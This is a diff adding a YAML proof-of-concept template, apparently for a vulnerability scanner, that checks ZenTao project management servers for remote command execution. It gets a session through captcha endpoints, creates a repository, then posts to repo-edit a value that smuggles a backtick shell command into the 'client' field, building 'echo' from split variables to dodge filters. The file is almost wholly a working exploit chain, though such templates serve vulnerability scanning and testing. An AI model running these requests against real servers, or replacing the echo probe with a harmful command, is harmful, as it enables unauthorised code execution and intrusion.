@@ -1,0 +1,66 @@
+name: poc-yaml-zentao-repoedit-rce
+transport: http
+set:
+  Sid: randomLowercase(26)
+  Num: randomInt(10000000, 99999999)
+  p1: randomLowercase(4)
+  p2: randomLowercase(4)
+  p3: randomLowercase(10)
+  rFer: request.url
+rules:
+  r0:
+    request:
+      method: GET
+      path: /zentao/misc-captcha-user.html
+      follow_redirects: false
+      headers:
+        Cookie: zentaosid={{Sid}}; lang=zh-cn; device=desktop; theme=default
+    expression: response.status == 200
+  r01:
+    request:
+      method: GET
+      path: /index.php?m=misc&f=captcha&sessionVar=user
+      follow_redirects: false
+      headers:
+        Cookie: zentaosid={{Sid}}; lang=zh-cn; device=desktop; theme=default
+    expression: response.status == 200
+  r02:
+    request:
+      method: GET
+      path: /index.php?m=block&f=printBlock&id=1&module=my
+      follow_redirects: false
+      headers:
+        Cookie: zentaosid={{Sid}}; lang=zh-cn; device=desktop; theme=default
+    expression: response.status == 200
+  r1:
+    request:
+      method: POST
+      path: /zentao/repo-create.html
+      follow_redirects: false
+      headers:
+        Referer: "{{rFer}}/zentao/repo-edit-1-0.html"
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: zentaosid={{Sid}}; lang=zh-cn; device=desktop; theme=default
+        X-Requested-With: XMLHttpRequest
+      body: >-
+        product%5B%5D=1&SCM=Gitlab&name={{Num}}&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
+    expression: >-
+      response.status == 200 && response.body_string.contains("result\":\"success")
+  r2:
+    request:
+      method: POST
+      path: /zentao/repo-edit-10000-10000.html
+      follow_redirects: false
+      headers:
+        Referer: "{{rFer}}/zentao/repo-edit-1-0.html"
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: zentaosid={{Sid}}; lang=zh-cn; device=desktop; theme=default
+        X-Requested-With: XMLHttpRequest
+      body: >-
+        SCM=Subversion&client=`{{p1}}="ec"%3b{{p2}}="ho"%3b${{p1}}${{p2}}%20{{p3}}`
+    expression: >-
+      response.status == 200 && response.body_string.contains(p3)
+expression: (r0() || r01() || r02()) && r1() && r2()
+detail:
+  author: S£cur1ty0(https://github.com/Secur1ty0)
+  links: [https://blog.csdn.net/qq_41904294/article/details/128838423]
